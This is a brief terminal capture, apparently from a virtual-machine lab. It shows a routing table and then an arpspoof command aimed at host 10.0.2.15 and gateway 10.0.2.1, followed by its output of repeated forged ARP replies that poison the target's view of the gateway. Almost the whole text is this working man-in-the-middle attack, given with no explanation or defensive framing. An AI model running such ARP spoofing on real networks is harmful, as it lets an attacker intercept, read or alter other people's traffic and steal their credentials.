```
route -n         
```

```
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.2.1        0.0.0.0         UG    100    0        0 eth0
10.0.2.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0
192.168.56.0    0.0.0.0         255.255.255.0   U     0      0        0 eth1

```

```
sudo arpspoof -t 10.0.2.15 10.0.2.1                                             
```                 

```
8:0:27:e7:b9:d1 8:0:27:e:34:8d 0806 42: arp reply 10.0.2.1 is-at 8:0:27:e7:b9:d1
8:0:27:e7:b9:d1 8:0:27:e:34:8d 0806 42: arp reply 10.0.2.1 is-at 8:0:27:e7:b9:d1
8:0:27:e7:b9:d1 8:0:27:e:34:8d 0806 42: arp reply 10.0.2.1 is-at 8:0:27:e7:b9:d1
8:0:27:e7:b9:d1 8:0:27:e:34:8d 0806 42: arp reply 10.0.2.1 is-at 8:0:27:e7:b9:d1
...
```